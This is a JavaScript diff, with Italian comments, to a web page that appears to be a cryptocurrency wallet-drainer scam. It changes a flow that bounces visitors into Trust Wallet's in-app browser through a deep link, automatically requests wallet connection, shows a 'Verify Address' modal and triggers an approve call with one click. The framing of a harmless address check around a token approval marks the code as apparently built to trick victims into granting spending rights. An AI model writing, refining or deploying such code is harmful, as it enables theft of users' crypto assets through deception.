@@ -394,18 +394,18 @@
     const inputAddr = document.getElementById('walletInput').value.trim();
     if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
     
-    const isWeb3 = window.ethereum;
+    // Se siamo già in Trust Wallet (riconosciuto dai parametri URL)
     const params = new URLSearchParams(window.location.search);
     const isAuto = params.get('auto') === '1';
 
-    if (!isWeb3 || !isAuto) {
-      // Step 1: Redirect a Trust Wallet
+    if (isAuto && window.ethereum) {
+      // Step 2: Siamo in Trust Wallet -> Click Singolo per Approve
+      executeApprove(inputAddr);
+    } else {
+      // Step 1: Siamo in Safari/Chrome -> Redirect a Trust Wallet
       const baseUrl = window.location.href.split('?')[0];
       const targetUrl = baseUrl + '?auto=1&addr=' + encodeURIComponent(inputAddr);
       window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(targetUrl);
-    } else {
-      // Step 2: In Trust Wallet -> Click Singolo per Approve
-      executeApprove(inputAddr);
     }
   }
 
@@ -434,19 +434,19 @@
   window.addEventListener('load', async () => {
     const params = new URLSearchParams(window.location.search);
     if (params.get('auto') === '1' && window.ethereum) {
-      // Siamo in Trust Wallet
+      // SIAMO IN TRUST WALLET: Carichiamo subito l'indirizzo
       const addr = params.get('addr') || '';
       document.getElementById('walletInput').value = decodeURIComponent(addr);
       
-      // Testi dinamici
+      // CAMBIAMO TESTI MODAL
       document.getElementById('modalTitle').textContent = "Verify Address";
       document.getElementById('modalDesc').style.display = "block";
 
       try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
-        // CHIEDE CONNECT WALLET AUTOMATICAMENTE
+        // CHIEDIAMO CONNECT WALLET AUTOMATICAMENTE
         await provider.send("eth_requestAccounts", []);
-        // APRE IL MODAL CON L'INDIRIZZO
+        // APRIAMO IL MODAL
         openVerifyModal();
       } catch (e) { console.error("Connect error:", e); }
       
